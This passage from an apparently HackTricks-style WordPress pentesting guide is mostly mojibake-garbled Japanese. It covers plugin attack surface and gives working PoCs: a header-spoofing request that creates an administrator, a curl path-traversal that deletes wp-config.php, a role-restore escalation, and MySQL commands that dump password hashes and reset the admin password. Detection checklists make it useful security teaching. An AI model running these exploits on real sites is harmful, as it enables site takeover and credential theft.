3. **Plugin Activation**: ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ãŒæ­£å¸¸ã«ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚ŒãŸã‚‰ã€ãƒ€ãƒƒã‚·ãƒ¥ãƒœãƒ¼ãƒ‰ã‹ã‚‰æœ‰åŠ¹åŒ–ã—ã¾ã™ã€‚
4. **Exploitation**:
- ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ "reflex-gallery" ãŒã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ãƒ»æœ‰åŠ¹åŒ–ã•ã‚Œã¦ã„ã‚‹ã¨ã€æ—¢çŸ¥ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã§ãã¾ã™ã€‚
- Metasploit framework ã¯ã“ã®è„†å¼±æ€§ç”¨ã®exploitã‚’æä¾›ã—ã¾ã™ã€‚é©åˆ‡ãªãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’èª­ã¿è¾¼ã¿ã€ç‰¹å®šã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã§ã€meterpreterã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’ç¢ºç«‹ã—ã€ã‚µã‚¤ãƒˆã¸ã®ä¸æ­£ã‚¢ã‚¯ã‚»ã‚¹ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚
- ã“ã‚Œã¯WordPressã‚µã‚¤ãƒˆã‚’æ‚ªç”¨ã™ã‚‹å¤šæ•°ã®æ–¹æ³•ã®ã†ã¡ã®ä¸€ã¤ã«éããªã„ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚

ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã«ã¯ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã¨æœ‰åŠ¹åŒ–æ‰‹é †ã‚’ç¤ºã™è¦–è¦šçš„ãªè£œåŠ©ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚ãŸã ã—ã€é©åˆ‡ãªè¨±å¯ãªã—ã«ã“ã®ã‚ˆã†ãªæ–¹æ³•ã§è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ã¯é•æ³•ã§ã‚ã‚Šéå€«ç†çš„ã§ã‚ã‚‹ç‚¹ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚ã“ã®æƒ…å ±ã¯è²¬ä»»ã‚’æŒã£ã¦ã€æ˜ç¢ºãªè¨±å¯ã®ã‚ã‚‹ penetration testing ã®ã‚ˆã†ãªåˆæ³•çš„ãªæ–‡è„ˆã§ã®ã¿ä½¿ç”¨ã—ã¦ãã ã•ã„ã€‚

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ ã¯ WordPress ã® **Cross-Site Scripting (XSS)** è„†å¼±æ€§ã‚’ **Remote Code Execution (RCE)** ã‚„ãã®ä»–ã®é‡å¤§ãªè„†å¼±æ€§ã¸ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã™ã‚‹ãŸã‚ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã§ã™ã€‚è©³ã—ãã¯ [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html) ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚**Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:** ã‚’ã‚µãƒãƒ¼ãƒˆã—ã€æ¬¡ã®ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™:
- _**Privilege Escalation:**_ WordPress ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆã—ã¾ã™ã€‚
- _**(RCE) Custom Plugin (backdoor) Upload:**_ ã‚«ã‚¹ã‚¿ãƒ ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ï¼ˆbackdoorï¼‰ã‚’ WordPress ã«ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™ã€‚
- _**(RCE) Built-In Plugin Edit:**_ WordPress ã®çµ„ã¿è¾¼ã¿ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚’ç·¨é›†ã—ã¾ã™ã€‚
- _**(RCE) Built-In Theme Edit:**_ WordPress ã®çµ„ã¿è¾¼ã¿ãƒ†ãƒ¼ãƒã‚’ç·¨é›†ã—ã¾ã™ã€‚
- _**(Custom) Custom Exploits:**_ ã‚µãƒ¼ãƒ‰ãƒ‘ãƒ¼ãƒ†ã‚£ã® WordPress ãƒ—ãƒ©ã‚°ã‚¤ãƒ³/ãƒ†ãƒ¼ãƒå‘ã‘ã®ã‚«ã‚¹ã‚¿ãƒ ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’æä¾›ã—ã¾ã™ã€‚

## Post Exploitation

ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®æŠ½å‡º:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
ç®¡ç†è€…ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å¤‰æ›´ã™ã‚‹:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Attack Surface

Wordpress plugin ãŒã©ã®ã‚ˆã†ã«æ©Ÿèƒ½ã‚’å…¬é–‹ã™ã‚‹ã‹ã‚’æŠŠæ¡ã™ã‚‹ã“ã¨ã¯ã€ãã®æ©Ÿèƒ½ã®è„†å¼±æ€§ã‚’ç™ºè¦‹ã™ã‚‹ä¸Šã§é‡è¦ã§ã™ã€‚ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ãŒæ©Ÿèƒ½ã‚’å…¬é–‹ã™ã‚‹æ–¹æ³•ã¯ä»¥ä¸‹ã®ç®‡æ¡æ›¸ãã«ç¤ºã—ã¦ã‚ã‚Šã€è„†å¼±ãªãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®ä¾‹ã¯ [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/) ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

- **`wp_ajax`**

ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ãŒæ©Ÿèƒ½ã‚’å…¬é–‹ã™ã‚‹æ–¹æ³•ã®ã²ã¨ã¤ãŒ AJAX handlers çµŒç”±ã§ã™ã€‚ã“ã‚Œã‚‰ã¯ãƒ­ã‚¸ãƒƒã‚¯ã‚„èªå¯ã€èªè¨¼ã®ãƒã‚°ã‚’å«ã‚€å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã•ã‚‰ã«ã€ã“ã‚Œã‚‰ã®é–¢æ•°ãŒèªè¨¼ã¨èªå¯ã®ä¸¡æ–¹ã‚’ wordpress nonce ã®å­˜åœ¨ã«ä¾å­˜ã—ã¦ã„ã‚‹ã‚±ãƒ¼ã‚¹ã¯ã‹ãªã‚Šé »ç¹ã«è¦‹ã‚‰ã‚Œã¾ã™ã€‚ãã® nonce ã¯ **Wordpress ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«èªè¨¼ã•ã‚ŒãŸä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒæŒã£ã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹**ï¼ˆå½¹å‰²ã«ä¾ã‚‰ãšï¼‰ãŸã‚ã§ã™ã€‚

ã“ã‚Œã‚‰ã¯ãƒ—ãƒ©ã‚°ã‚¤ãƒ³å†…ã®é–¢æ•°ã‚’å…¬é–‹ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹é–¢æ•°ã§ã™ï¼š
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv` ã®ä½¿ç”¨ã¯ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’ä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ï¼ˆæœªèªè¨¼ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’å«ã‚€ï¼‰ã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ã«ã—ã¾ã™ã€‚**

> [!CAUTION]
> ã•ã‚‰ã«ã€é–¢æ•°ãŒ `wp_verify_nonce` ã§ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®èªå¯ã®ã¿ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ã„ã‚‹å ´åˆã€ã“ã®é–¢æ•°ã¯å˜ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã¦ã„ã‚‹ã ã‘ã§ã€é€šå¸¸ã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ­ãƒ¼ãƒ«ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¾ã›ã‚“ã€‚ãã®ãŸã‚ã€æ¨©é™ã®ä½ã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒé«˜ã„æ¨©é™ã‚’è¦ã™ã‚‹æ“ä½œã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

- **REST API**

wordpress ã‹ã‚‰é–¢æ•°ã‚’å…¬é–‹ã™ã‚‹ã«ã¯ã€`register_rest_route` é–¢æ•°ã‚’ä½¿ã£ã¦ rest AP ã‚’ç™»éŒ²ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ï¼š
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` ã¯ã€ç‰¹å®šã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ API ãƒ¡ã‚½ãƒƒãƒ‰ã‚’å‘¼ã³å‡ºã™æ¨©é™ãŒã‚ã‚‹ã‹ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹ã‚³ãƒ¼ãƒ«ãƒãƒƒã‚¯é–¢æ•°ã§ã™ã€‚

**çµ„ã¿è¾¼ã¿ã® `__return_true` é–¢æ•°ãŒä½¿ã‚ã‚Œã¦ã„ã‚‹å ´åˆã€ãƒ¦ãƒ¼ã‚¶ãƒ¼æ¨©é™ã®ãƒã‚§ãƒƒã‚¯ã‚’å˜ç´”ã«ã‚¹ã‚­ãƒƒãƒ—ã—ã¾ã™ã€‚**

- **php ãƒ•ã‚¡ã‚¤ãƒ«ã¸ã®ç›´æ¥ã‚¢ã‚¯ã‚»ã‚¹**

ã‚‚ã¡ã‚ã‚“ã€Wordpress ã¯ PHP ã‚’ä½¿ç”¨ã—ã¦ãŠã‚Šã€ãƒ—ãƒ©ã‚°ã‚¤ãƒ³å†…ã®ãƒ•ã‚¡ã‚¤ãƒ«ã¯ã‚¦ã‚§ãƒ–ã‹ã‚‰ç›´æ¥ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ãŒãƒ•ã‚¡ã‚¤ãƒ«ã¸ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã ã‘ã§ç™ºå‹•ã™ã‚‹è„†å¼±ãªæ©Ÿèƒ½ã‚’å…¬é–‹ã—ã¦ã„ã‚‹å ´åˆã€ä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚ˆã£ã¦æ‚ªç”¨ã•ã‚Œå¾—ã¾ã™ã€‚

### Trusted-header REST impersonation (WooCommerce Payments â‰¤ 5.6.1)

ä¸€éƒ¨ã®ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯ã€å†…éƒ¨çµ±åˆã‚„ãƒªãƒãƒ¼ã‚¹ãƒ—ãƒ­ã‚­ã‚·å‘ã‘ã«ã€Œtrusted headerã€ã®ã‚·ãƒ§ãƒ¼ãƒˆã‚«ãƒƒãƒˆã‚’å®Ÿè£…ã—ã€ãã®ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’ REST ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ç¾åœ¨ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆè¨­å®šã«åˆ©ç”¨ã—ã¾ã™ã€‚ã‚‚ã—ãã®ãƒ˜ãƒƒãƒ€ãƒ¼ãŒä¸Šæµã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã§æš—å·çš„ã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«çµã³ä»˜ã‘ã‚‰ã‚Œã¦ã„ãªã‘ã‚Œã°ã€æ”»æ’ƒè€…ã¯ãã‚Œã‚’å½è£…ã—ã¦ç®¡ç†è€…ã¨ã—ã¦ç‰¹æ¨©ã®ã‚ã‚‹ REST ãƒ«ãƒ¼ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚

- å½±éŸ¿: core users REST ãƒ«ãƒ¼ãƒˆçµŒç”±ã§æ–°ã—ã„ç®¡ç†è€…ã‚’ä½œæˆã™ã‚‹ã“ã¨ã§ã€æœªèªè¨¼ã‹ã‚‰ç®¡ç†è€…ã¸ã®æ¨©é™æ˜‡æ ¼ãŒå¯èƒ½ã«ãªã‚‹ã€‚
- Example header: `X-Wcpay-Platform-Checkout-User: 1`ï¼ˆãƒ¦ãƒ¼ã‚¶ãƒ¼ ID 1 ã‚’å¼·åˆ¶ã€é€šå¸¸ã¯æœ€åˆã®ç®¡ç†è€…ã‚¢ã‚«ã‚¦ãƒ³ãƒˆï¼‰ã€‚
- Exploited route: `POST /wp-json/wp/v2/users` ã«æ˜‡æ ¼ã•ã‚ŒãŸ role é…åˆ—ã‚’é€ä¿¡ã™ã‚‹ã€‚

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Why it works
- ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ãŒã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆåˆ¶å¾¡ã®ãƒ˜ãƒƒãƒ€ã‚’èªè¨¼çŠ¶æ…‹ã«ãƒãƒƒãƒ—ã—ã€æ¨©é™ãƒã‚§ãƒƒã‚¯ã‚’ã‚¹ã‚­ãƒƒãƒ—ã™ã‚‹ã€‚
- WordPress core ã¯ã“ã®ãƒ«ãƒ¼ãƒˆã«å¯¾ã—ã¦ `create_users` æ¨©é™ã‚’æœŸå¾…ã™ã‚‹ï¼›ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®ãƒãƒƒã‚¯ã¯ãƒ˜ãƒƒãƒ€ã‹ã‚‰ç›´æ¥ current user context ã‚’è¨­å®šã™ã‚‹ã“ã¨ã§ã“ã‚Œã‚’å›é¿ã™ã‚‹ã€‚

Expected success indicators
- ä½œæˆã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’è¨˜è¿°ã™ã‚‹ JSON ãƒœãƒ‡ã‚£ã¨å…±ã«è¿”ã‚‹ HTTP 201ã€‚
- `wp-admin/users.php` ã«è¡¨ç¤ºã•ã‚Œã‚‹æ–°ã—ã„ admin ãƒ¦ãƒ¼ã‚¶ãƒ¼ã€‚

Detection checklist
- ãƒ¦ãƒ¼ã‚¶ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚’è¨­å®šã™ã‚‹ãŸã‚ã«ã‚«ã‚¹ã‚¿ãƒ ãƒ˜ãƒƒãƒ€ã‚’èª­ã‚€ `getallheaders()`, `$_SERVER['HTTP_...']`ã€ã¾ãŸã¯ãƒ™ãƒ³ãƒ€ãƒ¼ SDK ã‚’ grep ã™ã‚‹ï¼ˆä¾‹: `wp_set_current_user()`, `wp_set_auth_cookie()`ï¼‰ã€‚
- å …ç‰¢ãª `permission_callback` ãƒã‚§ãƒƒã‚¯ã‚’æ¬ ãã€ä»£ã‚ã‚Šã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ˜ãƒƒãƒ€ã«ä¾å­˜ã—ã¦ã„ã‚‹ç‰¹æ¨©ã‚³ãƒ¼ãƒ«ãƒãƒƒã‚¯ã® REST ç™»éŒ²ã‚’ãƒ¬ãƒ“ãƒ¥ãƒ¼ã™ã‚‹ã€‚
- REST ãƒãƒ³ãƒ‰ãƒ©å†…ã§ãƒ˜ãƒƒãƒ€å€¤ã ã‘ã§ã‚¬ãƒ¼ãƒ‰ã•ã‚Œã¦ã„ã‚‹ã‚³ã‚¢ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ç®¡ç†é–¢æ•°ï¼ˆ`wp_insert_user`, `wp_create_user`ï¼‰ã®ä½¿ç”¨ã‚’æ¢ã™ã€‚

### wp_ajax_nopriv ã‚’ä»‹ã—ãŸèªè¨¼ã•ã‚Œã¦ã„ãªã„ä»»æ„ã®ãƒ•ã‚¡ã‚¤ãƒ«å‰Šé™¤ (Litho Theme <= 3.0)

WordPress ã® themes ã‚„ plugins ã¯ `wp_ajax_` ã¨ `wp_ajax_nopriv_` ãƒ•ãƒƒã‚¯ã‚’é€šã˜ã¦ AJAX ãƒãƒ³ãƒ‰ãƒ©ã‚’å…¬é–‹ã™ã‚‹ã“ã¨ãŒå¤šã„ã€‚**_nopriv_** ãƒãƒªã‚¢ãƒ³ãƒˆãŒä½¿ã‚ã‚Œã‚‹ã¨**ã‚³ãƒ¼ãƒ«ãƒãƒƒã‚¯ã¯èªè¨¼ã•ã‚Œã¦ã„ãªã„è¨ªå•è€…ã‹ã‚‰åˆ°é”å¯èƒ½ã«ãªã‚‹**ãŸã‚ã€æ©Ÿå¯†æ€§ã®é«˜ã„ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã¯è¿½åŠ ã§ä»¥ä¸‹ã‚’å®Ÿè£…ã™ã‚‹å¿…è¦ãŒã‚ã‚‹:

1. **æ¨©é™ãƒã‚§ãƒƒã‚¯**ï¼ˆä¾‹: `current_user_can()` ã¾ãŸã¯å°‘ãªãã¨ã‚‚ `is_user_logged_in()`ï¼‰ã€ãŠã‚ˆã³
2. **CSRF nonce** ã‚’ `check_ajax_referer()` / `wp_verify_nonce()` ã§æ¤œè¨¼ã™ã‚‹ã“ã¨ã€ãŠã‚ˆã³
3. **å³æ ¼ãªå…¥åŠ›ã®ã‚µãƒ‹ã‚¿ã‚¤ã‚º / æ¤œè¨¼**ã€‚

Litho multipurpose theme (< 3.1) ã¯ *Remove Font Family* æ©Ÿèƒ½ã§ã“ã‚Œã‚‰3ã¤ã®åˆ¶å¾¡ã‚’å¿˜ã‚Œã¦ãŠã‚Šã€çµæœã¨ã—ã¦æ¬¡ã®ã‚³ãƒ¼ãƒ‰ï¼ˆç°¡ç•¥åŒ–ï¼‰ã‚’å‡ºè·ã—ã¦ã„ãŸ:
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Issues introduced by this snippet:

* **èªè¨¼ãªã—ã‚¢ã‚¯ã‚»ã‚¹** â€“ `wp_ajax_nopriv_` ãƒ•ãƒƒã‚¯ãŒç™»éŒ²ã•ã‚Œã¦ã„ã‚‹ã€‚
* **nonce / capability ãƒã‚§ãƒƒã‚¯ç„¡ã—** â€“ ä»»æ„ã®è¨ªå•è€…ãŒã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã€‚
* **ãƒ‘ã‚¹ã®ã‚µãƒ‹ã‚¿ã‚¤ã‚ºç„¡ã—** â€“ ãƒ¦ãƒ¼ã‚¶ãƒ¼åˆ¶å¾¡ã® `fontfamily` æ–‡å­—åˆ—ãŒãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ãªã—ã§ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ãƒ‘ã‚¹ã«é€£çµã•ã‚Œã€å¤å…¸çš„ãª `../../` ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ã‚’è¨±ã™ã€‚

#### æ‚ªç”¨

æ”»æ’ƒè€…ã¯å˜ä¸€ã® HTTP POST ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ã‚‹ã“ã¨ã§ã€**uploads base directory ä»¥ä¸‹**ï¼ˆé€šå¸¸ã¯ `<wp-root>/wp-content/uploads/`ï¼‰ã«ã‚ã‚‹ä»»æ„ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚„ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’å‰Šé™¤ã§ãã‚‹ï¼š
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

Other impactful targets include plugin/theme `.php` files (to break security plugins) or `.htaccess` rules.

#### Detection checklist

* Any `add_action( 'wp_ajax_nopriv_...')` callback that calls filesystem helpers (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.).
* Concatenation of unsanitised user input into paths (look for `$_POST`, `$_GET`, `$_REQUEST`).
* Absence of `check_ajax_referer()` and `current_user_can()`/`is_user_logged_in()`.

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

å¤šãã®ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯ã€ã‚ªãƒªã‚¸ãƒŠãƒ«ã®ãƒ­ãƒ¼ãƒ«ã‚’ user meta ã«ä¿å­˜ã—ã¦å¾Œã§å¾©å…ƒã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹ "view as role" ã‚„ä¸€æ™‚çš„ãªãƒ­ãƒ¼ãƒ«åˆ‡æ›¿æ©Ÿèƒ½ã‚’å®Ÿè£…ã—ã¦ã„ã‚‹ã€‚å¾©å…ƒå‡¦ç†ãŒãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ï¼ˆä¾‹ï¼š`$_REQUEST['reset-for']`ï¼‰ã¨ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ç®¡ç†ã®ãƒªã‚¹ãƒˆã®ã¿ã‚’é ¼ã‚Šã«ã—ã€capability ãƒã‚§ãƒƒã‚¯ã‚„æœ‰åŠ¹ãª nonce ã‚’è¡Œã‚ãªã„å ´åˆã€ã“ã‚Œã¯ vertical privilege escalation ã«ãªã‚‹ã€‚

å®Ÿä¾‹ã¯ Admin and Site Enhancements (ASE) ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ï¼ˆâ‰¤ 7.6.2.1ï¼‰ã§ç™ºè¦‹ã•ã‚ŒãŸã€‚ãƒªã‚»ãƒƒãƒˆå‡¦ç†ã¯ã€ãƒ¦ãƒ¼ã‚¶åãŒå†…éƒ¨é…åˆ— `$options['viewing_admin_as_role_are']` ã«å­˜åœ¨ã™ã‚‹å ´åˆã« `reset-for=<username>` ã«åŸºã¥ã„ã¦ãƒ­ãƒ¼ãƒ«ã‚’å¾©å…ƒã—ã¦ã„ãŸãŒã€ç¾åœ¨ã®ãƒ­ãƒ¼ãƒ«ã‚’å‰Šé™¤ã—ã¦ user meta `_asenha_view_admin_as_original_roles` ã‹ã‚‰ä¿å­˜ã•ã‚ŒãŸãƒ­ãƒ¼ãƒ«ã‚’å†è¿½åŠ ã™ã‚‹å‰ã« `current_user_can()` ãƒã‚§ãƒƒã‚¯ã‚‚ nonce æ¤œè¨¼ã‚‚è¡Œã£ã¦ã„ãªã‹ã£ãŸï¼š
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
ãªãœæ‚ªç”¨å¯èƒ½ã‹

- ã‚µãƒ¼ãƒãƒ¼å´ã®èªå¯ãªã—ã« `$_REQUEST['reset-for']` ã¨ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä¿¡é ¼ã—ã¦ã„ã‚‹ã€‚
- ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒä»¥å‰ã«ã‚ˆã‚Šé«˜ã„æ¨©é™ã‚’ `_asenha_view_admin_as_original_roles` ã«ä¿å­˜ã•ã‚Œã¦ãŠã‚Šã€ãã®å¾Œæ¨©é™ãŒä¸‹ã’ã‚‰ã‚Œã¦ã„ãŸå ´åˆã€reset path ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã§ãã®æ¨©é™ã‚’å¾©å…ƒã§ãã‚‹ã€‚
- ä¸€éƒ¨ã®ç’°å¢ƒã§ã¯ã€èªè¨¼æ¸ˆã¿ã®ä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ `viewing_admin_as_role_are` ã«ã¾ã æ®‹ã£ã¦ã„ã‚‹åˆ¥ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼åã®ãƒªã‚»ãƒƒãƒˆã‚’ãƒˆãƒªã‚¬ãƒ¼ã§ãã‚‹ï¼ˆèªå¯ã®ä¸å‚™ï¼‰ã€‚

Exploitation (example)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
On vulnerable builds this removes current roles and re-adds the saved original roles (e.g., `administrator`), effectively escalating privileges.

Detection checklist

- Look for role-switching features that persist â€œoriginal rolesâ€ in user meta (e.g., `_asenha_view_admin_as_original_roles`).
- Identify reset/restore paths that:
- Read usernames from `$_REQUEST` / `$_GET` / `$_POST`.
- Modify roles via `add_role()` / `remove_role()` without `current_user_can()` and `wp_verify_nonce()` / `check_admin_referer()`.
- Authorize based on a plugin option array (e.g., `viewing_admin_as_role_are`) instead of the actorâ€™s capabilities.

---

### Unauthenticated privilege escalation via cookieâ€‘trusted user switching on public init (Service Finder â€œsf-bookingâ€)

ä¸€éƒ¨ã®ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯ user-switching ãƒ˜ãƒ«ãƒ‘ãƒ¼ã‚’ public ã® `init` ãƒ•ãƒƒã‚¯ã«çµã³ä»˜ã‘ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆåˆ¶å¾¡ã® cookie ã‹ã‚‰è­˜åˆ¥ã‚’å°å‡ºã—ã¾ã™ã€‚ã‚³ãƒ¼ãƒ‰ãŒèªè¨¼ã€capabilityã€ãŠã‚ˆã³æœ‰åŠ¹ãª nonce ã‚’æ¤œè¨¼ã›ãšã« `wp_set_auth_cookie()` ã‚’å‘¼ã³å‡ºã™ã¨ã€æœªèªè¨¼ã®è¨ªå•è€…ãŒä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ ID ã¨ã—ã¦å¼·åˆ¶ãƒ­ã‚°ã‚¤ãƒ³ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

Typical vulnerable pattern (simplified from Service Finder Bookings â‰¤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
